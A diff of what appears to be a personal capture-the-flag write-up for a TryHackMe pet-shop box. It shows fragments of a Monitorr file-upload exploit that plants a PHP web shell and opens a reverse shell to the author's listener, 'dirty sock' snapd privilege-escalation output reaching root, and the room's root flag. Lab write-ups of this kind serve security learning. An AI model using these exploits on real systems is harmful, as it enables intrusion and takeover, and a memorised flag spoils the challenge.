@@ -76,7 +76,6 @@ PORT      STATE SERVICE    REASON
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 2043.92 seconds
 
-
 https://3.249.213.107/
 
 View certificates
@@ -200,8 +199,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 sess = requests.Session()
 sess.verify = False
 
-
-
 if len (sys.argv) != 4:
 	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
 else:
@@ -238,7 +235,6 @@ https://monitorr.robyns-petshop.thm/assets/data/usrimg/
 r = sess.post(url, headers=headers, data=data)
     print(r.text)
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
 <div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: she_ll.php was not uploaded.</div></div>
@@ -246,7 +242,6 @@ A shell script should be uploaded. Now we try to execute it
 
     r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})
     print(r.text)
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
@@ -277,8 +272,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 sess = requests.Session()
 sess.verify = False
 
-
-
 if len (sys.argv) != 4:
 	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
 else:
@@ -294,7 +287,6 @@ else:
     url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpg.phtml"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
     sess.get(url, headers=headers)
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 443
@@ -401,7 +393,6 @@ www-data@petshop:/tmp$ ./46362.py
 || Details || https://initblog.com/2019/dirty-sock     ||
 \\=========[]==========================================//
 
-
 [+] Slipped dirty sock on random socket file: /tmp/utntuvhgbo;uid=0;
 [+] Binding to socket file...
 [+] Connecting to snapd API...
@@ -439,12 +430,7 @@ root@petshop:/root# cat root.txt
 cat root.txt
 THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}
 
-
-
 ```
-
-![[Pasted image 20230629112821.png]]
-![[Pasted image 20230629113911.png]]
 
 Flag 1  
 
@@ -453,6 +439,5 @@ Flag 1
 Root Flag  
 
 *THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}*
-
 
 [[Year of the Pig]]
